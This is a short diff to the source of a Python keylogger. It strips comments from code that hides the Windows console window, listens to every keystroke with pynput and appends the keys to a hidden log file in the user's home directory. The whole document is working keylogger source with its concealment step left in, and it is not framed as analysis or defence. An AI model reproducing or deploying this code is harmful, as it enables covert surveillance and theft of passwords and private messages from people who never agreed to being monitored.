@@ -37,14 +37,11 @@ from pynput import keyboard
 import win32console
 import win32gui
 
-# Hide the console window (Windows only)
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
 
-# Define the log file path (in the user's home directory)
 log_file_path = os.path.join(os.path.expanduser("~"), "output.txt")
 
-# Function that is called whenever a key is pressed
 def press(key):
     try:
         key_str = str(key).replace("'", "")  # Clean up the key string
@@ -62,14 +59,12 @@ def press(key):
             print("Shutting down keylogger...")
             return False
 
-        # Append the key press to the log file
         with open(log_file_path, 'a') as f:
             f.write(key_str)
 
     except Exception as e:
         print(f"Error: {e}")
 
-# Start the listener to capture keystrokes
 with keyboard.Listener(on_press=press) as listener:
     listener.join()
 # Basic Keylogger in Python
@@ -118,7 +113,6 @@ def press(key):
     try:
         key_str = str(key).replace("'", "")  # Clean up the key string
 
-        # Handle special keys and control characters
         if key == keyboard.Key.enter:
             key_str = '\n'
         elif key == keyboard.Key.space:
